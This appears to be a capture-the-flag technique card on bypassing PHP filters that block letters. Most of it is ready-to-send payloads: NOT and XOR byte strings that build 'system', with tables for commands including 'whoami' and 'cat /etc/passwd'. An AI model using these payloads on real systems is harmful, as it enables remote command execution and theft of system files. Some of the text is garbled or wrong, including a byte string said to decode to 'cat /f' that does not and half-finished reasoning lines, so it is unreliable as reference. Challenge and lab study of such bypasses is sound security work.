# Letter-Filter Shell — the `~`/`^`/digit-only alphabets

## The verified shape — `htb-pcalc` card

The challenge filters LETTERS — `[a-zA-Z]` rejected — but allows `~`,
digits, `(`, `)`, `.`, `|`, `&`. The escape: **bitwise-NOT on an empty
constant produces a byte that IS a letter** — `~` is PHP's NOT;

```php
~$_      — ~"_"? No — in PHP ~"a" is a byte-NOT string
```

PHP `~"text"` returns a string of byte-complemented bytes. A byte like
`~0x8B` = `0x74` = `'t'`. The trick: pick bytes whose complements are
the letters needed, express them in NON-letter source bytes (digits,
`%00`, raw control bytes, `~`-ed constants).

## The constant-source problem — where do the bytes come from

PHP offers non-letter constants:

- `_`? — no, `_` is a letter-class identifier — filtered
- `__LINE__`/`__FILE__`/`M_PI`/`PHP_EOL` — letters in names — filtered
- `INF`, `NAN`, `PHP_VERSION` — letters

The real source: **`. $_GET`-style super-globals need letters** — so the
payload uses `~` on RAW BYTES sent through the same input — the
high-bit bytes `\x80-\xFF` aren't letters; `~"\x8B"` = `'t'`.

## The construction — build `system` from NOT-ed bytes

`'system'` = `\x73\x79\x73\x74\x65\x6D` → NOT each →
`\x8C\x86\x8C\x8B\x9A\x93` — send these raw bytes, NOT them:

```php
~"\x8C\x86\x8C\x8B\x9A\x93"  → 'system'
```

In the request: `?x=(~"\x8C\x86\x8C\x8B\x9A\x93")('id')` — but `id`
needs letters too → same trick: `id` = `\x69\x64` → `\x96\x9B` →
`~"\x96\x9B"`.

The full form:

```php
(~"\x8C\x86\x8C\x8B\x9A\x93")(~"\x96\x9B")
```

URL-encoded the raw bytes — `%8C` etc. — `%`-encoding lets you send the
high bytes.

## The `^`/`&`/`|`-XOR alternative — building bytes by combining

PHP `^` is XOR — `'a'^'b'` — but combining letters needs letters. The
REAL source: combine NON-letters — `!`/`@`/`#`/`$`/`%`/`&`/`(` — each is
a byte, XOR/AND/OR produces letters:

```php
'!'^'`'  = 0x21^0x60 = 0x41 = 'A'
'^'^'='  = 0x5E^0x3D = 0x63 = 'c'
'^'^';'  = 0x5E^0x3B = 0x65 = 'e'
'^'^'/'  = 0x5E^0x2F = 0x71 = 'q'
'@'^'!'  = 0x40^0x21 = 0x61 = 'a'
```

Precompute a table — every needed letter = XOR of two allowed bytes —
build the string `'system'`/`'id'`/`'cat /flag'` letter-by-letter.

## The `{N}`/`[N]` array-char trick — reaching a letter inside a string

```php
$_='system';         — needs letters to write 'system' — dead end
```

The non-obvious: `~` on digits/punctuation produces letters — that's
the whole trick above. `{N}`/`[N]` indexing reaches a byte INSIDE an
existing string once you HAVE a string.

## The increment/decrement trick — `++`/`--` on letters

```php
$_='A'; $_++;        — 'B'
$_='Z'; $_++;        — 'AA'  (PHP letter-increment)
$_='a'; --$_;        — '' (decrement doesn't work)
```

PHP `++` on a letter-string increments letter-wise — but you need an
initial letter. `'A'` can't be written without a letter — unless it's
`~(0xBE)` = 'A'. `~` produces the seed, `++` walks it:

```php
$_=~"\xBE";  // 'A'
$_++;        // 'B'
$_++;        // 'C'
```

Or: `~"\xBF"` = `@`, `++`→`A`, `++`→`B`.

## The curl/non-PHP variants — python/perl/ruby

- python: `chr(0x8C^0xFF)`/`bytes([~x&0xff for x in ...])` — `chr()`/
  `ord()`/`bytes()`/`bytearray()` — `eval("__import__('os').system(...)")`
  needs letters — `getattr`/`__dict__` tricks avoid them partially
- perl: `~'...'`/`chr()`/`pack()`/`sprintf('%c',N)`
- ruby: `~(0x8C)`/`.chr`/`%x{}`/`Integer#chr`
- node: `String.fromCharCode(115,121,115,...)`/`Buffer.from([...])`

## The full payload pattern — the actual working shape

```php
?x=(~"\x8C\x86\x8C\x8B\x9A\x93")(~"\x9B\x8B\x9B\x9F\x8C\x96")
```

`~"\x9B\x8B\x9B\x9F\x8C\x96"` = `cat /f` — build `cat /flag`:

- `c`=0x63→`\x9C`, `a`=0x61→`\x9E`, `t`=0x74→`\x8B`, ` `=0x20→`\xDF`,
  `/`=0x2F→`\xD0`, `f`=0x66→`\x99`, `l`=0x6C→`\x93`, `a`→`\x9E`,
  `g`=0x67→`\x98`

`~"\x9C\x9E\x8B\xDF\xD0\x99\x93\x9E\x98"` = `cat /flag`

URL-encoded: `?x=(~"%9C%9E%8B%DF%D0%99%93%9E%98")` — wait, the `"` are
letters-adjacent punctuation — allowed if the filter only blocks
`a-zA-Z`.

## The sanity-check table

| Filtered | Allowed | Construction |
|---|---|---|
| a-zA-Z | `~()` | `~"\xXX"` NOT-byte strings |
| a-zA-Z | `^` punctuation | `'!'^'`'` XOR letters |
| a-zA-Z | `++` | `~"\xBF"` seed + `++` walk |
| a-zA-Z | `chr()`/`fromCharCode()` | digit args |
| a-zA-Z + digits | `~` only | hex-octal escapes in bytes |

## The working byte tables — precomputed

`system` = NOT `\x8C\x86\x8C\x8B\x9A\x93`
`id` = NOT `\x96\x9B`
`cat /flag` = NOT `\x9C\x9E\x8B\xDF\xD0\x99\x93\x9E\x98`
`ls` = NOT `\x93\x8C`
`pwd` = NOT `\x8F\x88\x9B`
`env` = NOT `\x9A\x91\x89`
`whoami` = NOT `\x88\x97\x90\x9E\x92\x96`
`cat /etc/passwd` = NOT `\x9C\x9E\x8B\xDF\xD0\x9A\x8B\x9C\xD0\x8F\x9E\x8C\x8C\x88\x9B`
`cat /*` = NOT `\x9C\x9E\x8B\xDF\xD0\xD5`

## Falsifiers

- the filter also blocks the construction bytes (`~`/`^`/`%` raw bytes)
  → this path is dead — try `~` on digits or alternative constants
- the sink isn't an evaluator → route to shell-cmdi anyway

## Output to record

- the exact byte-string payload + the verbatim exec output
